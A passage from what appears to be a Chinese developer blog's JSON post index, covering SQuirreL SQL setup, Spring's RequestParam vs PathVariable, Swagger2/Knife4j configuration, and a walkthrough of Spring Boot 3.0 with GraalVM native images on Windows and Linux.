*/@Component@RocketMQMessageListener(consumerGroup = &quot;${rocketmq.producer.groupName}&quot;, topic = &quot;REGIST_USER&quot;)public class PersonMqListener implements RocketMQListener&lt;Person&gt; { @Override public void onMessage(User user) { System.out.println(&quot;接收到消息，开始消费..name:&quot; + user.getName() + &quot;,age:&quot; + user.getAge()); }} 12IvUserloginLogIvUserOperateLog # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/08/08/%E3%80%90RocketMQ%E3%80%91RocketMQ%E6%96%87%E6%A1%A3/"},{"title":"Squirrel SQL客户端安装与使用","text":"# 一、Squirrel 简介 Squirrel 是一个连接数据库的客户端工具，一般支持 JDBC 的数据库都可以用它来简介，如连接 MySQL。 # 二、安装准备 下载 jar 包：squirrel-sql-3.7.1-standard.jar # 三、安装 ①进入 squirrel-sql-3.7.1-standard.jar 文件所在的目录，在地址栏输入：cmd，进入命令窗口 ②在命令窗口输入：java -jar squirrel-sql-3.7.1-standard.jar，进入安装界面 点击 Next 点击 Next 自行选择安装目录，然后点击 Next 点击 Yes 在下面这个页面，最好选中所有的复选框，以免后续出问题，然后点击 Next 进入安装窗口，结束后点击 Next 选中复选框，然后点击 Next 点击 Done，完成安装 此时，桌面会多出一个图标 # 四、配置客户端 点击 SQuirrel，进入客户端页面 双击 Phoenix 安装包 将 phoenix-4.8.1-HBase-0.98-client.jar 文件拷贝到 SQuirrel 安装目录的 lib 目录下 添加驱动 点击 OK 后，出现下面界面，说明配置成功 可以看到添加的驱动 点击 Aliases，添加 “别名” 点击 Test，Connect 如下所示，配置成功 列表中出现添加的 Hadoop01 双击 Hadoop01，点击 TABLE 即可看到对应的表 至此，Squirrel SQL 客户端安装配置完成！ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/01/30/%E3%80%90SQl%E3%80%91SQuirreL%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"},{"title":"RequestParam 和 PathVariable的区别","text":"RequestParam 和 PathVariable 注解是用于从 request 中接收请求的，两个都可以接收参数，关键点不同的是 RequestParam 是从 request 里面拿取值，而 PathVariable 是从一个 URI 模板里面来填充 PathVariable 主要用于接收 http://host:port/path/{参数值} 数据: http://localhost:8887/test1/id1/name1 根据上面的这个 url，你可以用这样的方式来进行获取: RequestMapping(&quot;test1/{id}/{name}&quot;) public String testPathVariable(PathVariable String id, PathVariable String name) { return &quot;id=&quot; + id + &quot;, name=&quot; + name; } PathVariable 支持下面三种参数： name 绑定本次参数的名称，要跟 URL 上面的一样 required 这个参数是否必须的 value 跟 name 一样的作用，是 name 属性的一个别名 RequestParam 主要用于接收 http://host:port/path? 参数名 = 参数值数据，这里后面也可以不跟参数值； http://localhost:8887/test2?id=id2&amp;name=name2 根据上面的这个 url，你可以用这样的方式来进行获取: RequestMapping(&quot;test2&quot;) public String testRequestParam(RequestParam(&quot;id&quot;) String id, RequestParam(&quot;name&quot;) String name) { return &quot;id=&quot; + id + &quot;, name=&quot; + name; } RequestParam 支持下面四种参数： defaultValue 如果本次请求没有携带这个参数，或者参数为空，那么就会启用默认值 name 绑定本次参数的名称，要跟 URL 上面的一样 required 这个参数是否必须的 value 跟 name 一样的作用，是 name 属性的一个别名 PathVariable 和 RequestParam 混合使用 http://localhost:8887/test3/id3?name=name3 根据上面的这个 url，你可以用这样的方式来进行获取: RequestMapping(&quot;test3/{id}&quot;) public String test3(PathVariable String id, RequestParam(&quot;name&quot;) String name) { return &quot;id=&quot; + id + &quot;, name=&quot; + name; } 对比 1.用法上的不同： PathVariable只能用于接收url路径上的参数，而RequestParam只能用于接收请求带的params 2.内部参数不同： PathVariable有value，name，required这三个参数，而RequestParam也有这三个参数，并且比PathVariable多一个参数defaultValue（该参数用于当请求体中不包含对应的参数变量时，参数变量使用defaultValue指定的默认值） 3.PathVariable一般用于get和delete请求，RequestParam一般用于post请求。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/06/05/%E3%80%90SpringBoot%E3%80%91RequestParam%20%E5%92%8C%20PathVariable%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"title":"Knife4J接口文档","text":"Swagger2 及 knife4j 使用 最近项目中用到了 Swagger2 和 knife4j 作为接口文档。所以自己简单搭建了一套环境学习下，总体体验下来，这个框架很方便也很简单易用。 Swagger2 和 Swagger-ui springFox 官方推荐的是 Swagger2 和 Swagger-ui 配套使用 maven 依赖 io.springfox springfox-swagger2 2.9.2 io.springfox springfox-swagger-ui 2.9.2 增加配置文件 @Configuration @EnableSwagger2 public class Swagger2 { @Bean public Docket controllerApi() { return new Docket(DocumentationType.SWAGGER_2) .apiInfo(new ApiInfoBuilder() .title(&quot;文档说明--API接口文档&quot;) .description(&quot;包括保存、查询等&quot;) .version(&quot;版本号:1.0&quot;) .build()) .select() .apis(RequestHandlerSelectors.basePackage(&quot;com.example.myswagger.controller&quot;)) .paths(PathSelectors.any()) // 如果适配所有api，可以改为PathSelectors.any() .build(); } API 接口增加 swagger 注解 @Controller @RequestMapping @Api (tags = “接口服务”) public class HelloController { @ApiOperation(&quot;根目录&quot;) @GetMapping(&quot;/&quot;) @ResponseBody public String hello(){ System.out.println(&quot;23123&quot;); return &quot;hello&quot;; } @ApiOperation(&quot;保存用户信息&quot;) @ApiImplicitParams({ @ApiImplicitParam(name = &quot;name&quot;, value = &quot;名字&quot;, required = true, paramType = &quot;path&quot;), @ApiImplicitParam(name = &quot;age&quot;, dataType = &quot;int&quot;, value = &quot;年龄&quot;, required = true, paramType = &quot;query&quot;) }) @PostMapping(&quot;/save&quot;) @ResponseBody public Boolean save( @RequestParam(&quot;name&quot;) String name, @RequestParam(&quot;age&quot;) Integer age ) { return true; } 效果展示 启动项目访问 http://localhost:8080/swagger-ui.html 测试接口： 项目地址 https://gitee.com/LylYorick/myswagger swagger 注解详解 @Api：用在请求的类上，表示对类的说明 tags=“说明该类的作用，可以在 UI 界面上看到的注解” value=“该参数没什么意义，在 UI 界面上也看到，所以不需要配置” @ApiOperation：用在请求的方法上，说明方法的用途、作用 value=“说明方法的用途、作用” notes=“方法的备注说明” @ApiImplicitParams：用在请求的方法上，表示一组参数说明 @ApiImplicitParam：用在 @ApiImplicitParams 注解中，指定一个请求参数的各个方面 name：参数名 value：参数的汉字说明、解释 required：参数是否必须传 paramType：参数放在哪个地方 ・header --&gt; 请求参数的获取：@RequestHeader ・query --&gt; 请求参数的获取：@RequestParam ・path（用于 restful 接口）–&gt; 请求参数的获取：@PathVariable ・body（不常用） ・form（不常用） dataType：参数类型，默认 String，其它值 dataType=“Integer” defaultValue：参数的默认值 @ApiResponses：用在请求的方法上，表示一组响应 @ApiResponse：用在 @ApiResponses 中，一般用于表达一个错误的响应信息 code：数字，例如 400 message：信息，例如 &quot;请求参数没填好&quot; response：抛出异常的类 @ApiModel：用于响应类上，表示一个返回响应数据的信息 （这种一般用在 post 创建的时候，使用 @RequestBody 这样的场景， 请求参数无法使用 @ApiImplicitParam 注解进行描述的时候） @ApiModelProperty：用在属性上，描述响应类的属性 Swagger2 和 knife4j 虽然 Swagger-ui 很好，但是国人还是开发了一个 knife4j 的的 swaggerui，更加好看和方便使用 maven 依赖 12345678910&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.8&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.10.5&lt;/version&gt;&lt;/dependency&gt; 增加配置类 @Configuration @EnableSwagger2WebMvc public class Knife4jConfiguration { @Bean(value = &quot;defaultApi2&quot;) public Docket defaultApi2() { Docket docket=new Docket(DocumentationType.SWAGGER_2) .apiInfo(new ApiInfoBuilder() //.title(&quot;swagger-bootstrap-ui-demo RESTful APIs&quot;) .description(&quot;# swagger-bootstrap-ui-demo RESTful APIs&quot;) .termsOfServiceUrl(&quot;http://www.xx.com/&quot;) .contact(&quot;xx@qq.com&quot;) .version(&quot;1.0&quot;) .build()) //分组名称 .groupName(&quot;2.X版本&quot;) .select() //这里指定Controller扫描包路径 .apis(RequestHandlerSelectors.basePackage(&quot;com.example.myswaggerknife4j.controller&quot;)) .paths(PathSelectors.any()) .build(); return docket; } API 接口增加 swagger 注解 @Controller public class HelloController { @PostMapping(&quot;/save&quot;) @ResponseBody public Boolean save( @RequestParam(&quot;name&quot;) String name, @RequestParam(&quot;age&quot;) Integer age ) { return true; } 效果展示 访问 http://localhost:8080/doc.html 项目地址 https://gitee.com/LylYorick/my-swagger-knife4j # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/02/02/%E3%80%90SpringBoot%E3%80%91Knife4J%E6%8E%A5%E5%8F%A3%E6%96%87%E6%A1%A3/"},{"title":"【SpringBoot】SpringBoot3.0 云原生时代即将来临！","text":"# 【SpringBoot】SpringBoot3.0 云原生时代即将来临！ # 云原生时代的 Spring Boot 3.0: GraalVM 原生镜像，启动速度提升近 30 倍 InterviewCoder # Spring Boot 3.0 于（2022 年 11 月 24 日）发布，变化很大，基于 spring6.0，spring6.0 是 Spring 下一个未来十年的新开端。 # JAVA 17 Spring Boot 3.0 版本最低支持 Java17，Springboot 2.7.3 最常用的 jdk 版本是 Java 8，现在直接跳了 9 个版本直接从 8 跳到了 17，且是强制要求，必须 17 或 17 以上的 java 版本。所以以后开发可以用上 17 或 17 以上的 Java 语言的新特性。 # Spring Native Spring Native 也是升级的一个重大特性，支持使用 GraalVM 将 Spring 的应用程序编译成本地可执行的镜像文件，可以显著提升启动速度、峰值性能以及减少内存使用。 我们传统的应用都是编译成字节码，然后通过 JVM 解释并最终编译成机器码来运行，而 Spring Native 则是通过 AOT 提前编译为机器码，在运行时直接静态编译成可执行文件，不依赖 JVM。 # Jakarta EE JavaEE 改名之后就叫 JakartaEE，比如我们之前的 javax.servlet 包现在就叫 jakarta.servlet。也因此，代码中所有使用到比如 HttpServletRequest 对象的 import 都需要修改。 123import javax.servlet.http.HttpServletRequest;// 改为import jakarta.servlet.http.HttpServletRequest; # Spring Boot 3.0 初步使用（Windows） 创建 Spring Boot 3.0 项目有两种方式，一种是 Idea 直接创建。 若 IDE 不是最新版本，不支持创建 Spring Boot 3.0，还有第二种方式创建 Spring Boot 3.0 项目，登录官网 https://start.spring.io/ 生成 Spring Boot 3.0 初始项目。 下面是 Spring Boot 3.0 的最小 pom 文件内容： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.example&lt;/groupId&gt; &lt;artifactId&gt;demo&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;demo&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;17&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 运行 spring boot 项目，需要安装开发环境，spring boot 3.0 开始不用 jdk 了，取而代之的是 graalvm，且最低版本要求是 java17 graalvm 版本。 https://github.com/graalvm/graalvm-ce-builds/releases 下载对应操作系统的 java17 graalvm 版本。 1234PS C:\\Users\\hanwei&gt; java --versionopenjdk 17.0.5 2022-10-18OpenJDK Runtime Environment GraalVM CE 22.3.0 (build 17.0.5+8-jvmci-22.3-b08)OpenJDK 64-Bit Server VM GraalVM CE 22.3.0 (build 17.0.5+8-jvmci-22.3-b08, mixed mode, sharing) 在最小 Spring Boot 项目源码的基础上了个简单的 controller。 1234567891011121314151617181920package com.example.demo.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;@Controllerpublic class QuickStartController { @RequestMapping(&quot;/test&quot;) @ResponseBody public String test(){ return &quot;springboot 3.0 访问测试&quot;; } @RequestMapping(&quot;/hello&quot;) @ResponseBody public String home(){ return &quot;Hello World from springboot 3.0!&quot;; }} 用 java17 graalvm 编译运行 demo 项目。 12345678910111213141516171819C:\\sdk\\graalvm-ce-java17-22.3.0\\bin\\java.exe -XX:TieredStopAtLevel=1 -Dspring.output.ansi.enabled=always -Dcom.sun.management.jmxremote -Dspring.jmx.enabled=true -Dspring.liveBeansView.mbeanDomain -Dspring.application.admin.enabled=true &quot;-javaagent:C:\\Program Files\\JetBrains\\IntelliJ IDEA 2022.2\\lib\\idea_rt.jar=9872:C:\\Program Files\\JetBrains\\IntelliJ IDEA 2022.2\\bin&quot; -Dfile.encoding=UTF-8 -classpath C:\\Users\\hanwei\\Documents\\JavaProject\\demo-maven\\target\\classes;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\boot\\spring-boot-starter\\3.0.0\\spring-boot-starter-3.0.0.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\boot\\spring-boot\\3.0.0\\spring-boot-3.0.0.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\spring-context\\6.0.2\\spring-context-6.0.2.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\boot\\spring-boot-autoconfigure\\3.0.0\\spring-boot-autoconfigure-3.0.0.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\boot\\spring-boot-starter-logging\\3.0.0\\spring-boot-starter-logging-3.0.0.jar;C:\\Users\\hanwei\\.m2\\repository\\ch\\qos\\logback\\logback-classic\\1.4.5\\logback-classic-1.4.5.jar;C:\\Users\\hanwei\\.m2\\repository\\ch\\qos\\logback\\logback-core\\1.4.5\\logback-core-1.4.5.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\apache\\logging\\log4j\\log4j-to-slf4j\\2.19.0\\log4j-to-slf4j-2.19.0.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\apache\\logging\\log4j\\log4j-api\\2.19.0\\log4j-api-2.19.0.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\slf4j\\jul-to-slf4j\\2.0.4\\jul-to-slf4j-2.0.4.jar;C:\\Users\\hanwei\\.m2\\repository\\jakarta\\annotation\\jakarta.annotation-api\\2.1.1\\jakarta.annotation-api-2.1.1.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\spring-core\\6.0.2\\spring-core-6.0.2.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\spring-jcl\\6.0.2\\spring-jcl-6.0.2.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\yaml\\snakeyaml\\1.33\\snakeyaml-1.33.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\slf4j\\slf4j-api\\2.0.4\\slf4j-api-2.0.4.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\boot\\spring-boot-starter-web\\3.0.0\\spring-boot-starter-web-3.0.0.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\boot\\spring-boot-starter-json\\3.0.0\\spring-boot-starter-json-3.0.0.jar;C:\\Users\\hanwei\\.m2\\repository\\com\\fasterxml\\jackson\\core\\jackson-databind\\2.14.1\\jackson-databind-2.14.1.jar;C:\\Users\\hanwei\\.m2\\repository\\com\\fasterxml\\jackson\\core\\jackson-annotations\\2.14.1\\jackson-annotations-2.14.1.jar;C:\\Users\\hanwei\\.m2\\repository\\com\\fasterxml\\jackson\\core\\jackson-core\\2.14.1\\jackson-core-2.14.1.jar;C:\\Users\\hanwei\\.m2\\repository\\com\\fasterxml\\jackson\\datatype\\jackson-datatype-jdk8\\2.14.1\\jackson-datatype-jdk8-2.14.1.jar;C:\\Users\\hanwei\\.m2\\repository\\com\\fasterxml\\jackson\\datatype\\jackson-datatype-jsr310\\2.14.1\\jackson-datatype-jsr310-2.14.1.jar;C:\\Users\\hanwei\\.m2\\repository\\com\\fasterxml\\jackson\\module\\jackson-module-parameter-names\\2.14.1\\jackson-module-parameter-names-2.14.1.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\boot\\spring-boot-starter-tomcat\\3.0.0\\spring-boot-starter-tomcat-3.0.0.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\apache\\tomcat\\embed\\tomcat-embed-core\\10.1.1\\tomcat-embed-core-10.1.1.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\apache\\tomcat\\embed\\tomcat-embed-el\\10.1.1\\tomcat-embed-el-10.1.1.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\apache\\tomcat\\embed\\tomcat-embed-websocket\\10.1.1\\tomcat-embed-websocket-10.1.1.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\spring-web\\6.0.2\\spring-web-6.0.2.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\spring-beans\\6.0.2\\spring-beans-6.0.2.jar;C:\\Users\\hanwei\\.m2\\repository\\io\\micrometer\\micrometer-observation\\1.10.2\\micrometer-observation-1.10.2.jar;C:\\Users\\hanwei\\.m2\\repository\\io\\micrometer\\micrometer-commons\\1.10.2\\micrometer-commons-1.10.2.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\spring-webmvc\\6.0.2\\spring-webmvc-6.0.2.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\spring-aop\\6.0.2\\spring-aop-6.0.2.jar;C:\\Users\\hanwei\\.m2\\repository\\org\\springframework\\spring-expression\\6.0.2\\spring-expression-6.0.2.jar com.example.demo.DemoApplication . ____ _ __ _ _ /\\\\ / ___'_ __ _ _(_)_ __ __ _ \\ \\ \\ \\( ( )\\___ | '_ | '_| | '_ \\/ _` | \\ \\ \\ \\ \\\\/ ___)| |_)| | | | | || (_| | ) ) ) ) ' |____| .__|_| |_|_| |_\\__, | / / / / =========|_|==============|___/=/_/_/_/ :: Spring Boot :: (v3.0.0)2022-11-29T10:19:58.816+08:00 INFO 20116 --- [ main] com.example.demo.DemoApplication : Starting DemoApplication using Java 17.0.5 with PID 20116 (C:\\Users\\hanwei\\Documents\\JavaProject\\demo-maven\\target\\classes started by hanwei in C:\\Users\\hanwei\\Documents\\JavaProject\\demo-maven)2022-11-29T10:19:58.818+08:00 INFO 20116 --- [ main] com.example.demo.DemoApplication : No active profile set, falling back to 1 default profile: &quot;default&quot;2022-11-29T10:19:59.501+08:00 INFO 20116 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat initialized with port(s): 8080 (http)2022-11-29T10:19:59.510+08:00 INFO 20116 --- [ main] o.apache.catalina.core.StandardService : Starting service [Tomcat]2022-11-29T10:19:59.510+08:00 INFO 20116 --- [ main] o.apache.catalina.core.StandardEngine : Starting Servlet engine: [Apache Tomcat/10.1.1]2022-11-29T10:19:59.594+08:00 INFO 20116 --- [ main] o.a.c.c.C.[Tomcat].[localhost].[/] : Initializing Spring embedded WebApplicationContext2022-11-29T10:19:59.594+08:00 INFO 20116 --- [ main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 737 ms2022-11-29T10:19:59.866+08:00 INFO 20116 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat started on port(s): 8080 (http) with context path ''2022-11-29T10:19:59.872+08:00 INFO 20116 --- [ main] com.example.demo.DemoApplication : Started DemoApplication in 1.386 seconds (process running for 2.036) rest api 测试 ok。 123456789101112131415161718192021222324http://localhost:8080/helloHTTP/1.1 200 Content-Type: text/plain;charset=UTF-8Content-Length: 32Date: Mon, 28 Nov 2022 08:31:59 GMTKeep-Alive: timeout=60Connection: keep-aliveHello World from springboot 3.0!Response code: 200; Time: 175ms (175 ms); Content length: 32 bytes (32 B)http://localhost:8080/testHTTP/1.1 200 Content-Type: text/plain;charset=UTF-8Content-Length: 27Date: Mon, 28 Nov 2022 08:32:05 GMTKeep-Alive: timeout=60Connection: keep-alivespringboot 3.0 访问测试Response code: 200; Time: 17ms (17 ms); Content length: 19 bytes (19 B) 打包二进制可执行文件需要安装 native-image ， 执行 gu install native-image 命令。 打包二进制可执行文件，执行出错： 上面报错，因为需要安装 windows docker。 官网下载安装 windows dockerdesktop 完成后。启动 windows dockerdesktop 报错（可能是因为 Windows 11 的默认网络配置被改了，正常不会报错，毕竟是很常用的工具）： 1234567891011121314151617181920212223242526stderr: 在 Docker.ApiServices.WSL2.WslShortLivedCommandResult.LogAndThrowIfUnexpectedExitCode(String prefix, ILogger log, Int32 expectedExitCode) 位置 C:\\workspaces\\PR-19568\\src\\github.com\\docker\\pinata\\win\\src\\Docker.ApiServices\\WSL2\\WslCommand.cs:行号 160 在 Docker.Engines.WSL2.WSL2Provisioning.&lt;ProvisionAsync&gt;d__8.MoveNext() 位置 C:\\workspaces\\PR-19568\\src\\github.com\\docker\\pinata\\win\\src\\Docker.Engines\\WSL2\\WSL2Provisioning.cs:行号 81--- 引发异常的上一位置中堆栈跟踪的末尾 --- 在 System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() 在 System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) 在 Docker.Engines.WSL2.LinuxWSL2Engine.&lt;DoStartAsync&gt;d__26.MoveNext() 位置 C:\\workspaces\\PR-19568\\src\\github.com\\docker\\pinata\\win\\src\\Docker.Engines\\WSL2\\LinuxWSL2Engine.cs:行号 170--- 引发异常的上一位置中堆栈跟踪的末尾 --- 在 System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() 在 System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) 在 Docker.ApiServices.StateMachines.TaskExtensions.&lt;WrapAsyncInCancellationException&gt;d__0.MoveNext() 位置 C:\\workspaces\\PR-19568\\src\\github.com\\docker\\pinata\\win\\src\\Docker.ApiServices\\StateMachines\\TaskExtensions.cs:行号 29--- 引发异常的上一位置中堆栈跟踪的末尾 --- 在 System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() 在 System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) 在 Docker.ApiServices.StateMachines.StartTransition.&lt;DoRunAsync&gt;d__5.MoveNext() 位置 C:\\workspaces\\PR-19568\\src\\github.com\\docker\\pinata\\win\\src\\Docker.ApiServices\\StateMachines\\StartTransition.cs:行号 67--- 引发异常的上一位置中堆栈跟踪的末尾 --- 在 System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() 在 Docker.ApiServices.StateMachines.StartTransition.&lt;DoRunAsync&gt;d__5.MoveNext() 位置 C:\\workspaces\\PR-19568\\src\\github.com\\docker\\pinata\\win\\src\\Docker.ApiServices\\StateMachines\\StartTransition.cs:行号 92--- 引发异常的上一位置中堆栈跟踪的末尾 --- 在 System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() 在 System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) 在 Docker.ApiServices.StateMachines.EngineStateMachine.&lt;StartAsync&gt;d__14.MoveNext() 位置 C:\\workspaces\\PR-19568\\src\\github.com\\docker\\pinata\\win\\src\\Docker.ApiServices\\StateMachines\\EngineStateMachine.cs:行号 69--- 引发异常的上一位置中堆栈跟踪的末尾 --- 在 System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() 在 System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) 在 Docker.Engines.Engines.&lt;StartAsync&gt;d__22.MoveNext() 位置 C:\\workspaces\\PR-19568\\src\\github.com\\docker\\pinata\\win\\src\\Docker.Engines\\Engines.cs:行号 106 在 PowerShell（管理员模式）或者 cmd（管理员模式）中执行 1netsh winsock reset 执行该命令后记得重启！ 重启后，Windows 11 下的 dockerdesktop 可以正常启动。 对于没有 vmware 需求，没有虚拟机 vpn 网络需求，仅仅开发 springboot3.0，上面的方式已经可以实现目标。 不过若有 VMware 需求，以及有 VMware 虚拟机共享宿主机 vpn 网络的需求，上面的重置命令慎用，会导致 VMware 里运行的虚拟机使用宿主机 vpn 网络出现问题，网络不通。 并且由于 windows 下的 dockerdesktop 需要打开 hyper-v 或者 WSL 2，一旦打开会影响 VMware 嵌套虚拟化功能，导致 VMware 下虚拟机的嵌套虚拟化功能不可用。 不过也不用担心，只需要 3 步可以恢复： 卸载 windows dockerdesktop 设置 - 应用 - 可选功能 - 更多 windows 功能，取消 WSL 2 和 hyper-v 的勾，重启电脑 卸载 wmware，重新安装 wmware。 这种情况还是在沙盒环境里编译打包原生可执行文件，比如下面的用 Linux 环境。 # Spring Boot 3.0 初步使用（Linux） 上面 windows 跑通的项目源码直接放到 Linux 下，执行，报错： 12[ERROR] Internal error: java.lang.RuntimeException: GraalVM native-image is missing from your system.[ERROR] Make sure that GRAALVM_HOME environment variable is present. 按报错信息，配置 GRAALVM_HOME 和 安装 GraalVM native-image。 123456export GRAALVM_HOME 到/etc/bashrc[hanwei@backendcloud-centos9 ~]$ gu install native-imageDownloading: Component catalog from www.graalvm.orgProcessing Component: Native ImageDownloading: Component native-image: Native Image from github.comInstalling new component: Native Image (org.graalvm.native-image, version 22.3.0) 再执行报错： 1Test configuration file wasn't found. toggle ‘Skip Tests’ mode，就是在 Linux Idea 的 Maven 窗口，点击跳过测试按钮。 再执行 ok。 12345678910111213141516171819/home/hanwei/sdk/graalvm-ce-java17-22.3.0/bin/java -XX:TieredStopAtLevel=1 -Dspring.output.ansi.enabled=always -Dcom.sun.management.jmxremote -Dspring.jmx.enabled=true -Dspring.liveBeansView.mbeanDomain -Dspring.application.admin.enabled=true -javaagent:/home/hanwei/.local/share/JetBrains/Toolbox/apps/IDEA-U/ch-0/222.4459.24/lib/idea_rt.jar=41343:/home/hanwei/.local/share/JetBrains/Toolbox/apps/IDEA-U/ch-0/222.4459.24/bin -Dfile.encoding=UTF-8 -classpath /home/hanwei/demo/target/classes:/home/hanwei/.m2/repository/org/springframework/boot/spring-boot-starter/3.0.0/spring-boot-starter-3.0.0.jar:/home/hanwei/.m2/repository/org/springframework/boot/spring-boot/3.0.0/spring-boot-3.0.0.jar:/home/hanwei/.m2/repository/org/springframework/spring-context/6.0.2/spring-context-6.0.2.jar:/home/hanwei/.m2/repository/org/springframework/boot/spring-boot-autoconfigure/3.0.0/spring-boot-autoconfigure-3.0.0.jar:/home/hanwei/.m2/repository/org/springframework/boot/spring-boot-starter-logging/3.0.0/spring-boot-starter-logging-3.0.0.jar:/home/hanwei/.m2/repository/ch/qos/logback/logback-classic/1.4.5/logback-classic-1.4.5.jar:/home/hanwei/.m2/repository/ch/qos/logback/logback-core/1.4.5/logback-core-1.4.5.jar:/home/hanwei/.m2/repository/org/apache/logging/log4j/log4j-to-slf4j/2.19.0/log4j-to-slf4j-2.19.0.jar:/home/hanwei/.m2/repository/org/apache/logging/log4j/log4j-api/2.19.0/log4j-api-2.19.0.jar:/home/hanwei/.m2/repository/org/slf4j/jul-to-slf4j/2.0.4/jul-to-slf4j-2.0.4.jar:/home/hanwei/.m2/repository/jakarta/annotation/jakarta.annotation-api/2.1.1/jakarta.annotation-api-2.1.1.jar:/home/hanwei/.m2/repository/org/springframework/spring-core/6.0.2/spring-core-6.0.2.jar:/home/hanwei/.m2/repository/org/springframework/spring-jcl/6.0.2/spring-jcl-6.0.2.jar:/home/hanwei/.m2/repository/org/yaml/snakeyaml/1.33/snakeyaml-1.33.jar:/home/hanwei/.m2/repository/org/slf4j/slf4j-api/2.0.4/slf4j-api-2.0.4.jar:/home/hanw